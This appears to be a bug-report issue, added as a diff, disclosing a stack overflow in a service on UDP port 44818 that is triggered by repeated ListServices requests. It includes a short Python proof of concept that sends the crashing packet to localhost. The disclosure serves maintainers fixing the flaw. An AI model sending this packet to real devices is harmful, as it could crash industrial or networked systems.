@@ -1,0 +1,28 @@
+issue #445
+
+Hello, when I use UDP socket on port 44818 to send the ListServices request message (IP: 127.0.0.1), a stack overflow vulnerability occurs. The following is the input message (hexadecimal) that caused the vulnerability (11 sequences of 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00, where 04 represents the ListServices message)
+
+PoC
+
+import socket
+
+
+sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+udp_addr = ('localhost', 44818)
+
+data = bytes.fromhex('04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00' 
+                    '04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
+                    '04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
+                    '04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
+                    '04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
+                    '04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
+                    '04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
+                    '04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
+                    '04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
+                    '04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00'
+                    '04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00')
+
+sock.sendto(data, udp_addr)
+
+sock.close()
